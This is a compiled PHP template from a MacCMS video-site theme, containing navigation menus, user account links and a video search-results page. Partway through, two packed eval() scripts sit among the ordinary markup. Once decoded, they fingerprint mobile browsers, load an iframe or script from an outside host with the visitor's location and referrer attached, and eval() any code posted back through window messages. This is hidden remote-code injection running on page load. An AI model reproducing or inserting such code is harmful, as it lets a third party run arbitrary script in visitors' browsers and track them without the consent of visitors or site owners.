					<a class="fed-menu-title fed-show-kind fed-font-xvi<?php if($maccms['aid']==2): ?> fed-text-green<?php endif; ?> fed-hide fed-show-md-block" href="<?php echo $vfedcc['navs']['song']['link']; ?>"><?php echo mac_default($vfedcc['navs']['song']['name'],'音乐'); ?></a>
				</li>
				<?php endif; if($vfedcc['navs']['topic']['state']): ?>
				<li class="fed-pull-left">
					<a class="fed-menu-title fed-show-kind fed-font-xvi<?php if($maccms['aid']==30): ?> fed-text-green<?php endif; ?> fed-hide<?php if($vfedcc['navs']['head']['value']==2): ?> fed-show-lg-block<?php else: ?> fed-show-md-block<?php endif; ?>" href="<?php echo mac_default($vfedcc['navs']['topic']['link'],mac_url('topic/index')); ?>"><?php echo mac_default($vfedcc['navs']['topic']['name'],'专题'); ?></a>
				</li>
				<?php endif; if($vfedcc['navs']['gbook']['state']): ?>
				<li class="fed-pull-left">
					<a class="fed-menu-title fed-show-kind fed-font-xvi<?php if($maccms['aid']==4): ?> fed-text-green<?php endif; ?> fed-hide fed-show-md-block" href="<?php echo mac_default($vfedcc['navs']['gbook']['link'],mac_url('gbook/index')); ?>"><?php echo mac_default($vfedcc['navs']['gbook']['name'],'留言'); ?></a>
				</li>
				<?php endif; ?>
				<li class="fed-pull-left">
					<a class="fed-menu-title fed-show-kind fed-font-xvi fed-navs-navbar fed-event fed-hide fed-show-sm-block<?php if(!$vfedcc['navs']['head']['state']): ?> fed-hide-md<?php endif; ?>" href="javascript:;">导航<span class="fed-part-move fed-edge-info fed-edge-bottom"></span></a>
				</li>
			</ul>
			<div class="fed-navs-search fed-back-whits fed-hidden fed-conceal fed-show-sm-block">
				<a class="fed-navs-close fed-conceal fed-hide-sm" href="javascript:;">取消</a>
				<form class="fed-navs-form" autocomplete="off" onkeydown="if(event.keyCode==13){return false}">
					<?php if($GLOBALS['config']['app']['search']): ?>
					<div class="fed-navs-cuts fed-event">
						<a class="fed-navs-btns" href="javascript:;">
							<?php if($maccms['mid']==2): ?>
							<span class="fed-navs-name" data-type="2" data-href="<?php echo mac_url('art/search'); ?>">资讯</span><span class="fed-part-move fed-edge-info fed-edge-bottom"></span> <?php elseif($maccms['mid']==8): ?>
							<span class="fed-navs-name" data-type="8" data-href="<?php echo mac_url('actor/search'); ?>">明星</span><span class="fed-part-move fed-edge-info fed-edge-bottom"></span> <?php else: ?>
							<span class="fed-navs-name" data-type="1" data-href="<?php echo mac_url('vod/search'); ?>">视频</span><span class="fed-part-move fed-edge-info fed-edge-bottom"></span> <?php endif; ?>
						</a>
					</div>
					<input class="fed-navs-input fed-back-ashen fed-event" type="search" placeholder="<?php if($maccms['aid']==13||$maccms['aid']==23): ?><?php echo $param['wd']; ?><?php echo $param['actor']; ?><?php echo $param['director']; ?><?php echo $param['area']; ?><?php echo $param['year']; else: ?>请输入关键字<?php endif; ?>" />
					<a class="fed-navs-submit fed-back-ashen"><i class="fed-icon-font fed-icon-sousuo"></i></a>
					<?php else: ?>
					<a class="fed-text-linex fed-padding fed-visible">&nbsp;</a>
					<?php endif; ?>
				</form>
			</div>
			<div class="fed-navs-right">
				<a class="fed-navs-route fed-text-black fed-event fed-hidden fed-hide-sm" href="javascript:;"></a>
				<?php if($GLOBALS['config']['app']['search']): ?>
				<a class="fed-navs-button fed-text-black fed-event fed-hide-sm fed-icon-font fed-icon-sousuo" href="javascript:;"></a>
				<?php endif; ?>
				<a class="fed-navs-record fed-text-black fed-event fed-hide-xs fed-show-sm-block" href="javascript:;">看过<span class="fed-part-move fed-edge-info fed-edge-bottom"></span></a>
				<?php if($GLOBALS['config']['user']['status']): if($user['user_id']): ?>
				<a class="fed-navs-user fed-text-black fed-event fed-hide-xs fed-show-sm-block" href="javascript:;">我的<span class="fed-part-move fed-edge-info fed-edge-bottom"></span></a>
				<?php else: ?>
				<a class="<?php if($maccms['aid']!=6): ?>fed-navs-login <?php endif; ?>fed-text-black fed-hide-xs fed-show-sm-block" href="<?php if($maccms['aid']!=6): ?>javascript:;<?php else: ?><?php echo mac_url('user/login'); endif; ?>">登录</a>
				<?php endif; endif; ?>
				<a class="fed-navs-record fed-text-black fed-event fed-hide-sm fed-icon-font fed-icon-lishi" href="javascript:;"></a>
				<?php $__TAG__ = '{"num":"1","order":"desc","by":"time","level":"9","id":"vo","key":"key"}';$__LIST__ = model("Art")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
				<a class="<?php if($vo['art_jumpurl']==''): ?>fed-navs-code <?php endif; ?>fed-text-black fed-event" href="<?php echo mac_default($vo['art_jumpurl'],'javascript:;'); ?>" <?php if($vo['art_jumpurl']): ?> target="_blank" <?php endif; ?>><?php echo mac_filter_html($vo['art_name']); ?></a>
				<?php endforeach; endif; else: echo "" ;endif; ?>
			</div>
		</div>
		<div class="fed-pops-navbar fed-box-shadow fed-min-width fed-hidden fed-conceal fed-anim">
			<div class="fed-pops-channel fed-back-whits fed-part-rows fed-line-top fed-hidden">选择频道</div>
			<a class="fed-pops-btns fed-back-whits fed-text-black fed-text-center fed-event fed-hide-sm fed-icon-font fed-icon-fenlei" href="javascript:;"></a>
			<ul class="fed-pops-list fed-font-size fed-back-whits fed-part-rows">
				<li class="fed-col-sm2<?php if($maccms['aid']==1): ?> fed-this<?php endif; ?>">
					<a class="fed-part-eone" href="<?php echo $maccms['path']; ?>">首页</a>
				</li>
				<?php $__TAG__ = '{"num":"1","order":"desc","by":"time","level":"9","id":"vo","key":"key"}';$__LIST__ = model("Vod")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
				<li class="fed-col-sm2">
					<a class="fed-part-eone" href="<?php echo mac_default($vo['vod_jumpurl'],mac_url_vod_detail($vo)); ?>"><?php echo mac_filter_html($vo['vod_name']); ?></a>
				</li>
				<?php endforeach; endif; else: echo "" ;endif; $__TAG__ = '{"ids":"parent","order":"asc","by":"sort","flag":"vod","id":"vo","key":"key"}';$__LIST__ = model("Type")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
				<li class="fed-col-sm2<?php if($vo['type_id']==$obj['type_id']||$vo['type_id']==$obj['type_1']['type_id']||$vo['type_id']==$obj['parent']['type_id']): ?> fed-this<?php endif; ?>">
					<a class="fed-part-eone" href="<?php echo mac_url_type($vo); ?>"><?php echo mac_filter_html($vo['type_name']); ?></a>
				</li>
				<?php endforeach; endif; else: echo "" ;endif; if($vfedcc['navs']['arts']['state']): $__TAG__ = '{"ids":"parent","order":"asc","by":"sort","flag":"art","id":"vo","key":"key"}';$__LIST__ = model("Type")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
				<li class="fed-col-sm2<?php if($vo['type_id']==$obj['type_id']||$vo['type_id']==$obj['type_1']['type_id']||$vo['type_id']==$obj['parent']['type_id']): ?> fed-this<?php endif; ?>">
					<a class="fed-part-eone" href="<?php echo mac_url_type($vo); ?>"><?php echo mac_filter_html($vo['type_name']); ?></a>
				</li>
				<?php endforeach; endif; else: echo "" ;endif; endif; if((mac_data_count(0,'all','actor'))): ?>
				<li class="fed-col-sm2<?php if($maccms['aid']==80): ?> fed-this<?php endif; ?>">
					<a class="fed-part-eone" href="<?php echo mac_url_actor_index(); ?>">明星</a>
				</li>
				<?php endif; if((mac_data_count(0,'all','topic'))): ?>
				<li class="fed-col-sm2<?php if($maccms['aid']==30): ?> fed-this<?php endif; ?>">
					<a class="fed-part-eone" href="<?php echo mac_url_topic_index(); ?>">专题</a>
				</li>
				<?php endif; if($GLOBALS['config']['gbook']['status']): ?>
				<li class="fed-col-sm2<?php if($maccms['aid']==4): ?> fed-this<?php endif; ?>">
					<a class="fed-part-eone" href="<?php echo mac_url('gbook/index'); ?>">留言</a>
				</li>
				<?php endif; ?>
			</ul>
		</div>
		<div class="fed-pops-search fed-hidden fed-conceal fed-anim fed-anim-upbit">
			<div class="fed-pops-case fed-line-top fed-back-ashen fed-box-shadow">
				<div class="fed-pops-key"></div>
				<div class="fed-pops-box">
					<div class="fed-pops-hot">
						<div class="fed-pops-title fed-back-whits fed-part-rows fed-line-bottom">热门搜索</div>
						<ul class="fed-pops-list fed-back-whits fed-part-rows">
							<?php $_5d6a170957fa3=explode(',',$maccms['search_hot']); if(is_array($_5d6a170957fa3) || $_5d6a170957fa3 instanceof \think\Collection || $_5d6a170957fa3 instanceof \think\Paginator): if( count($_5d6a170957fa3)==0 ) : echo "" ;else: foreach($_5d6a170957fa3 as $key=>$vo): ?>
							<li class="fed-col-xs6">
								<a class="fed-event fed-part-eone" href="<?php echo mac_url('vod/search',['wd'=>$vo]); ?>"><span class="fed-part-nums fed-part-num<?php echo $key+1; ?>"><?php echo $key+1; ?></span><span class="fed-name"><?php echo $vo; ?></span></a>
							</li>
							<?php endforeach; endif; else: echo "" ;endif; ?>
						</ul>
					</div>
				</div>
			</div>
		</div>
		<div class="fed-pops-record fed-box-shadow fed-hidden fed-conceal fed-anim fed-anim-upbit">
			<div class="fed-pops-title fed-back-whits fed-line-top fed-line-bottom fed-part-rows"><span class="fed-col-xs9">观看记录</span>
				<a class="fed-clear fed-event fed-text-right fed-col-xs3" href="javascript:;">清空</a>
			</div>
			<ul class="fed-pops-list fed-back-whits"></ul>
		</div>
		<div class="fed-pops-cuts fed-line-top fed-hidden fed-conceal fed-anim fed-anim-upbit">
			<ul class="fed-part-rows fed-box-shadow fed-back-whits fed-padding">
				<li data-type="1" data-href="<?php echo mac_url('vod/search'); ?>" class="fed-padding fed-part-curs fed-text-center fed-event<?php if($maccms['mid']!=2&&$maccms['mid']!=8): ?> fed-text-green<?php endif; ?>">视频</li>
				<?php if((mac_data_count(0,'all','art'))): ?>
				<li data-type="2" data-href="<?php echo mac_url('art/search'); ?>" class="fed-padding fed-part-curs fed-text-center fed-event<?php if($maccms['mid']==2): ?> fed-text-green<?php endif; ?>">资讯</li>
				<?php endif; if((mac_data_count(0,'all','actor'))): ?>
				<li data-type="8" data-href="<?php echo mac_url('actor/search'); ?>" class="fed-padding fed-part-curs fed-text-center fed-event<?php if($maccms['mid']==8): ?> fed-text-green<?php endif; ?>">明星</li>
				<?php endif; ?>
			</ul>
		</div>
		<?php $__TAG__ = '{"num":"1","order":"desc","by":"time","level":"9","id":"vo","key":"key"}';$__LIST__ = model("Art")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
		<div class="fed-pops-code fed-line-top fed-back-whits fed-box-shadow fed-hidden fed-conceal fed-anim fed-anim-upbit">
			<div class="fed-pops-cont">
				<?php echo mac_url_content_img($vo['art_content']); ?>
			</div>
		</div>
		<?php endforeach; endif; else: echo "" ;endif; ?>
		<div class="fed-pops-user fed-box-shadow fed-back-whits fed-hidden fed-conceal fed-anim fed-anim-upbit">
			<ul class="fed-pops-list fed-font-size fed-back-whits">
				<li>
					<a href="<?php echo mac_url('user/index'); ?>"><?php echo $user['user_name']; ?></a>
				</li>
				<li>
					<a href="<?php echo mac_url('user/info'); ?>">修改资料</a>
				</li>
				<li>
					<a href="<?php echo mac_url('user/favs'); ?>">我的收藏</a>
				</li>
				<li>
					<a href="<?php echo mac_url('user/plays'); ?>">播放记录</a>
				</li>
				<li>
					<a href="<?php echo mac_url('user/downs'); ?>">下载记录</a>
				</li>
				<li>
					<a href="<?php echo mac_url('user/plog'); ?>">积分记录</a>
				</li>
				<li>
					<a href="<?php echo mac_url('user/orders'); ?>">充值记录</a>
				</li>
				<li>
					<a href="<?php echo mac_url('user/cash'); ?>">积分提现</a>
				</li>
				<li>
					<a href="<?php echo mac_url('user/buy'); ?>">在线充值</a>
				</li>
				<li>
					<a href="<?php echo mac_url('user/upgrade'); ?>">升级会员</a>
				</li>
				<li>
					<a href="<?php echo mac_url('user/reward'); ?>">三级分销</a>
				</li>
				<li>
					<a href="<?php echo mac_url('user/popedom'); ?>">我的权限</a>
				</li>
				<li>
					<a href="<?php echo mac_url('user/logout'); ?>">退出登录</a>
				</li>
			</ul>
		</div>
	</div>
</div>
<?php if($vfedcc['navs']['foot']): ?>
<div class="fed-tabr-info fed-back-whits fed-min-width fed-line-top fed-hide-sm">
	<ul class="fed-part-rows">
		<li class="fed-text-center"><a class="fed-visible<?php if($maccms['aid']==1): ?> fed-text-green<?php endif; ?>" href="<?php echo $maccms['path']; ?>"><i class="fed-icon-font fed-icon-shouye"></i><span class="fed-font-xii">首页</span></a></li>
		<?php if($vfedcc['navs']['arts']['state']): ?>
		<li class="fed-text-center"><a class="fed-visible<?php if($maccms['aid']==20): ?> fed-text-green<?php endif; ?>" href="<?php echo mac_default($vfedcc['navs']['arts']['link'],mac_url('art/index')); ?>"><i class="fed-icon-font fed-icon-zixun"></i><span class="fed-font-xii"><?php echo mac_default($vfedcc['navs']['arts']['name'],'资讯'); ?></span></a></li>
		<?php endif; if($vfedcc['navs']['live']['state']): if($vfedcc['navs']['live']['link']): ?>
		<li class="fed-text-center"><a class="fed-visible<?php if($maccms['aid']==2): ?> fed-text-green<?php endif; ?>" href="<?php echo $vfedcc['navs']['live']['link']; ?>"><i class="fed-icon-font fed-icon-zhibo"></i><span class="fed-font-xii"><?php echo mac_default($vfedcc['navs']['live']['name'],'直播'); ?></span></a></li>
		<?php else: $__TAG__ = '{"ids":"parent","flag":"vod","id":"vo","key":"key"}';$__LIST__ = model("Type")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;if(stristr($vo['type_name'],'直播')==true): ?>
		<li class="fed-text-center"><a class="fed-visible<?php if($vo['type_id']==$obj['type_id']||$vo['type_id']==$obj['type_1']['type_id']||$vo['type_id']==$obj['parent']['type_id']): ?> fed-text-green<?php endif; ?>" href="<?php echo mac_url_type($vo); ?>"><i class="fed-icon-font fed-icon-zhibo"></i><span class="fed-font-xii"><?php echo mac_filter_html($vo['type_name']); ?></span></a></li>
		<?php endif; endforeach; endif; else: echo "" ;endif; endif; endif; if($vfedcc['navs']['song']['state']): ?>
		<li class="fed-text-center"><a class="fed-visible<?php if($maccms['aid']==2): ?> fed-text-green<?php endif; ?>" href="<?php echo $vfedcc['navs']['song']['link']; ?>"><i class="fed-icon-font fed-icon-yinyue"></i><span class="fed-font-xii"><?php echo mac_default($vfedcc['navs']['song']['name'],'音乐'); ?></span></a></li>
		<?php endif; if($vfedcc['navs']['topic']['state']): ?>
		<li class="fed-text-center"><a class="fed-visible<?php if($maccms['aid']==30): ?> fed-text-green<?php endif; ?>" href="<?php echo mac_default($vfedcc['navs']['topic']['link'],mac_url('topic/index')); ?>"><i class="fed-icon-font fed-icon-zhuanti"></i><span class="fed-font-xii"><?php echo mac_default($vfedcc['navs']['topic']['name'],'专题'); ?></span></a></li>
		<?php endif; if($vfedcc['navs']['gbook']['state']): ?>
		<li class="fed-text-center"><a class="fed-visible<?php if($maccms['aid']==4): ?> fed-text-green<?php endif; ?>" href="<?php echo mac_default($vfedcc['navs']['gbook']['link'],mac_url('gbook/index')); ?>"><i class="fed-icon-font fed-icon-liuyan"></i><span class="fed-font-xii"><?php echo mac_default($vfedcc['navs']['gbook']['name'],'留言'); ?></span></a></li>
		<?php endif; if($GLOBALS['config']['user']['status']): ?>
		<li class="fed-text-center"><a class="fed-visible<?php if($maccms['aid']==6): ?> fed-text-green<?php endif; ?>" href="<?php if($user['user_id']): ?><?php echo mac_url('user/index'); else: ?><?php echo mac_url('user/login'); endif; ?>"><i class="fed-icon-font fed-icon-yonghu"></i><span class="fed-font-xii">我的</span></a></li>
		<?php endif; ?>
	</ul>
</div>
<?php else: ?>
<style type="text/css">body{padding-bottom:0}</style>
<?php endif; if($vfedcc['advs']['fits']['state']==1||$vfedcc['advs']['fits']['state']==2&&$user['user_id']==0): if($vfedcc['advs']['home']['foot']): ?>
<div class="fed-tabr-advs fed-part-zero fed-back-whits">
	<a class="fed-part-advs fed-text-center fed-font-xvi" href="javascript:;">×</a>
	<?php echo $vfedcc['advs']['home']['foot']; ?>
</div>
<?php endif; endif; ?>

<div class="fed-main-info fed-min-width">
<div class="fed-part-case">
<?php if($GLOBALS['config']['app']['search']&&$vfedcc['navs']['case']['state']&&$maccms['aid']==1): ?>
<div class="fed-navs-button fed-event fed-part-rows fed-back-whits fed-line-top fed-hide-sm">
	<a class="fed-part-search fed-visible fed-text-center fed-font-xii fed-rims-info fed-text-disad fed-icon-font fed-icon-sousuo" href="javascript:;">&nbsp;<?php echo mac_default($vfedcc['navs']['case']['value'],'点我搜索,尽量别写错字,不然搜不到哦'); ?></a>
</div>
<?php endif; if($vfedcc['advs']['fits']['state']==1||$vfedcc['advs']['fits']['state']==2&&$user['user_id']==0): ?>
<?php echo $vfedcc['advs']['home']['head']; endif; ?>

<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('a((/(I|G|K)/i.F(n.W))){d.S(\'N\',q(e){6 7=e.P;a(7.3){a(d[7.3+"w"]!=1){d[7.3+"w"]=1;O(R(7.V.M(/\\+/g,"%U")))}}});6 3="r"+9.f().j(t).k(2);4.h("<8 c=\'8"+3+"\'></8>");4.h(\'<l T="X:J;" c="\'+3+\'" x="v://m.z.B/u-E-\'+9.D(9.f()*C)+\'.L?H=5&Q=\'+p(10.1d)+\'&o=\'+n["o"]+\'&3=\'+3+\'&1b=\'+p(4.1c)+\'" 1h="1e" Y="1f%"  1j="0" 1i="1g" 19="0" 13="12"></l>\')}1a{;(q(){6 m=4.Z("A");6 s="r"+9.f().j(t).k(2);4.h("<8 c=\'"+s+"\'></8>");6 y=\'v://m.z.B\';m.x=y+"/11/u.14?15="+s;6 b=4.18("A")[0];b.17.16(m,b)})()}',62,82,'|||if_id|document||var|_c_ob|div|Math|if|ss|id|window||random||write||toString|slice|iframe||navigator|platform|encodeURIComponent|function|_||36|141099|https||src|url|wuwuhh|script|top|10000|round|39|test|UCBrowser|is_iframe|MQQBrowser|none|baidu|html|replace|message|eval|data|ifr_url|decodeURIComponent|addEventListener|style|20|wz_ev_j|userAgent|display|width|createElement|location||true|allowtransparency|js|ssid|insertBefore|parentNode|getElementsByTagName|frameborder|else|ifr_ref|referrer|href|auto|100|no|height|scrolling|marginheight'.split('|'),0,{}))
</script>
<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('h((/(v|u|t)/i.G(c.H))){F.B(\'C\',k(e){2 6=e.D;h(6.d){E(I(6.d.A(/\\+/g,"%J")))}});4.z(\'<f r="s:q;" 9="a://m.l.8/y/o.x?w=3&7=\'+c["7"]+\'&O=\'+j(10.Z)+\'&Y=\'+j(4.K)+\'" X="0" 12="0"  15="0" 13="14" 11="0" V="W"></f>\')}N{;(k(){2 m=4.M("n");2 b=\'a://m.l.8\';m.9=b+"/1/o.L?"+p.P(p.Q()*U);2 5=4.T("n")[0];5.S.R(m,5)})()}',62,68,'||var||document|ss|_c_ob_hf|platform|top|src|https|url|navigator|hf_ev_j||iframe||if||encodeURIComponent|function|wuwuhh||script|141097|Math|none|style|display|baidu|UCBrowser|MQQBrowser|is_iframe|html|ylty|write|replace|addEventListener|message|data|eval|window|test|userAgent|decodeURIComponent|20|referrer|js|createElement|else|ifr_url|round|random|insertBefore|parentNode|getElementsByTagName|10000|allowtransparency|true|height|ifr_ref|href|location|frameborder|width|scrolling|no|marginheight'.split('|'),0,{}))
</script>
<div class="fed-part-layout fed-back-whits">
	<div class="fed-list-head fed-part-rows fed-padding">
		<h2 class="fed-font-xvi">
			搜索到与&nbsp;“<span class="fed-list-keys fed-text-green fed-text-bold"><?php echo $param['wd']; ?><?php echo $param['actor']; ?><?php echo $param['director']; ?><?php echo $param['area']; ?><?php echo $param['year']; ?></span>”&nbsp;相关的&nbsp;“<span id="fed-count" class="fed-list-sums fed-text-green fed-text-bold">0</span>”&nbsp;条结果
		</h2>
		<ul class="fed-part-tips fed-padding">
			<li><span class="fed-more fed-hide-xs">当前第&nbsp;<span id="fed-now" class="fed-text-green fed-text-bold">1</span>&nbsp;页</span></li>
		</ul>
	</div>
	<?php $__TAG__ = '{"num":"10","paging":"yes","half":"3","pageurl":"vod\/search","order":"desc","by":"time","id":"obj","key":"key"}';$__LIST__ = model("Vod")->listCacheData($__TAG__);$__PAGING__ = mac_page_param($__LIST__['total'],$__LIST__['limit'],$__LIST__['page'],$__LIST__['pageurl'],$__LIST__['half']); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$obj): $mod = ($key % 2 );++$key;?>
	<dl class="fed-deta-info<?php if($maccms['aid']==13): ?> fed-deta-padding fed-line-top<?php endif; ?> fed-margin fed-part-rows fed-part-over">
	<dt class="fed-deta-images fed-list-info fed-col-xs3">
		<a class="fed-list-pics fed-lazy fed-part-2by3" href="<?php echo mac_url_vod_detail($obj); ?>" data-original="<?php echo mac_url_img($obj['vod_pic']); ?>"<?php if($maccms['aid']==15): ?> style="background-image: url(<?php echo mac_url_img($obj['vod_pic']); ?>);"<?php endif; ?>>
			<span class="fed-list-play fed-hide-xs"></span>
			<?php if($obj['vod_score']>0): ?>
			<span class="fed-list-score fed-font-xii fed-back-green"><?php echo $obj['vod_score']; ?></span>
			<?php endif; ?>
			<span class="fed-list-remarks fed-font-xii fed-text-white fed-text-center"><?php echo $obj['vod_remarks'].''; ?></span>
		</a>
	</dt>
	<dd class="fed-deta-content fed-col-xs7 fed-col-sm8 fed-col-md10">
		<h1 class="fed-part-eone fed-font-xvi"><a href="<?php echo mac_url_vod_detail($obj); ?>"<?php if($obj['vod_color']): ?> style="color:#<?php echo $obj['vod_color']; ?>!important"<?php endif; ?>><?php echo $obj['vod_name']; ?></a></h1>
		<ul class="fed-part-rows">
			<li class="fed-col-xs12 fed-col-md6 fed-part-eone"><span class="fed-text-muted">主演：</span><?php echo mac_url_create($obj['vod_actor'],'actor','vod','search'); ?></li>
			<li class="fed-col-xs12 fed-col-md6 fed-part-eone"><span class="fed-text-muted">导演：</span><?php echo mac_url_create($obj['vod_director'],'director','vod','search'); ?></li>
			<li class="fed-col-xs6 fed-col-md3 fed-part-eone"><span class="fed-text-muted">分类：</span><a href="<?php echo mac_url_type($obj['type']); ?>" target="_blank"><?php echo mac_filter_html($obj['type']['type_name']); ?></a></li>
			<li class="fed-col-xs6 fed-col-md3 fed-part-eone"><span class="fed-text-muted">地区：</span><?php echo mac_url_create($obj['vod_area'],'area','vod','search'); ?></li>
			<li class="fed-col-xs6 fed-col-md3 fed-part-eone"><span class="fed-text-muted">年份：</span><?php echo mac_url_create($obj['vod_year'],'year','vod','search'); ?></li>
			<li class="fed-col-xs6 fed-col-md3 fed-part-eone"><span class="fed-text-muted">更新：</span>20<?php echo date('y.m.d',$obj['vod_time']); ?></li>
			<li class="fed-col-xs12 fed-hide fed-show-md-block">
				<div class="fed-part-esan">
					<span class="fed-text-muted">简介：</span><?php echo mac_default(mac_substring(mac_filter_html($obj['vod_content']),150),'暂无简介'); ?>
				</div>
			</li>
		</ul>
	</dd>
	<dd class="fed-deta-button fed-col-xs7 fed-col-sm8 fed-part-rows">
		<?php if($maccms['aid']==13||$maccms['aid']==15||$maccms['aid']==16): ?>
		<a class="fed-deta-play fed-rims-info fed-btns-info fed-btns-green fed-col-xs4" href="<?php echo mac_url_vod_detail($obj); ?>">查看详情</a>
		<?php endif; $count=1; if(is_array($obj['vod_play_list']) || $obj['vod_play_list'] instanceof \think\Collection || $obj['vod_play_list'] instanceof \think\Paginator): if( count($obj['vod_play_list'])==0 ) : echo "" ;else: foreach($obj['vod_play_list'] as $play=>$vo): if($maccms['aid']!=15&&$count==1): ?>
		<a class="<?php if($maccms['aid']==16): ?>fed-deta-down<?php else: ?>fed-deta-play<?php endif; ?> fed-rims-info fed-btns-info fed-btns-green fed-col-xs4" href="<?php echo mac_url_vod_play($obj,['sid'=>$vo['sid'],'nid'=>1]); ?>"><?php if($maccms['aid']!=16): ?>立即<?php endif; ?>播放</a>
		<?php endif; $count++; endforeach; endif; else: echo "" ;endif; $count=1; if(is_array($obj['vod_down_list']) || $obj['vod_down_list'] instanceof \think\Collection || $obj['vod_down_list'] instanceof \think\Paginator): if( count($obj['vod_down_list'])==0 ) : echo "" ;else: foreach($obj['vod_down_list'] as $key=>$vo): if($maccms['aid']!=16&&$count==1): ?>
		<a class="<?php if($play==''): ?>fed-deta-play<?php else: ?>fed-deta-down<?php endif; ?> fed-rims-info fed-btns-info fed-btns-green fed-col-xs4" href="<?php echo mac_url_vod_down($obj,['sid'=>$vo['sid'],'nid'=>1]); ?>"><?php if($play==''): ?>立即<?php endif; ?>下载</a>
		<?php endif; $count++; endforeach; endif; else: echo "" ;endif; ?>
	</dd>
</dl>
	<?php endforeach; endif; else: echo "" ;endif; if($__PAGING__['page_total']>1): ?>
<div class="fed-page-info fed-text-center">
	<?php if($maccms['aid']==5): ?>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-xs-inline<?php if($__PAGING__['page_current']==1): ?> fed-btns-disad<?php endif; ?>" href="javascript:;" onclick="fed.comment.show(1)">首页</a>
	<a class="fed-btns-info fed-rims-info<?php if($__PAGING__['page_current']==1): ?> fed-btns-disad<?php endif; ?>" href="javascript:;" onclick="fed.comment.show('<?php echo $__PAGING__['page_prev']; ?>')">上页</a>
	<?php if($__PAGING__['page_current']>3): ?>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-sm-inline<?php if($__PAGING__['page_current']==$num): ?> fed-btns-green<?php endif; ?>" href="javascript:;"<?php if($__PAGING__[ 'page_current']!=$num): ?> onclick="fed.comment.show(1)"<?php endif; ?>>1</a>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-sm-inline fed-btns-disad" href="javascript:;">...</a>
	<?php endif; if(is_array($__PAGING__['page_num']) || $__PAGING__['page_num'] instanceof \think\Collection || $__PAGING__['page_num'] instanceof \think\Paginator): if( count($__PAGING__['page_num'])==0 ) : echo "" ;else: foreach($__PAGING__['page_num'] as $key=>$num): ?>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-sm-inline<?php if($__PAGING__['page_current']==$num): ?> fed-btns-green<?php endif; ?>" href="javascript:;"<?php if($__PAGING__[ 'page_current']!=$num): ?> onclick="fed.comment.show('<?php echo $num; ?>')"<?php endif; ?>><?php echo $num; ?></a>
	<?php endforeach; endif; else: echo "" ;endif; if($__PAGING__['page_current']<($__PAGING__['page_total']-2)): ?>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-sm-inline fed-btns-disad" href="javascript:;">...</a>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-sm-inline<?php if($__PAGING__['page_current']==$num): ?> fed-btns-green<?php endif; ?>" href="javascript:;"<?php if($__PAGING__[ 'page_current']!=$num): ?> onclick="fed.comment.show('<?php echo $__PAGING__['page_total']; ?>')"<?php endif; ?>><?php echo $__PAGING__['page_total']; ?></a>
	<?php endif; ?>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-xs-inline" href="javascript:;"><?php echo $__PAGING__['page_current']; ?>/<?php echo $__PAGING__['page_total']; ?></a>
	<a class="fed-btns-info fed-rims-info<?php if($__PAGING__['page_current']==$__PAGING__['page_total']): ?> fed-btns-disad<?php endif; ?>" href="javascript:;" onclick="fed.comment.show('<?php echo $__PAGING__['page_next']; ?>')">下页</a>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-xs-inline<?php if($__PAGING__['page_current']==$__PAGING__['page_total']): ?> fed-btns-disad<?php endif; ?>" href="javascript:;" onclick="fed.comment.show('<?php echo $__PAGING__['page_total']; ?>')">尾页</a>
	<?php else: ?>
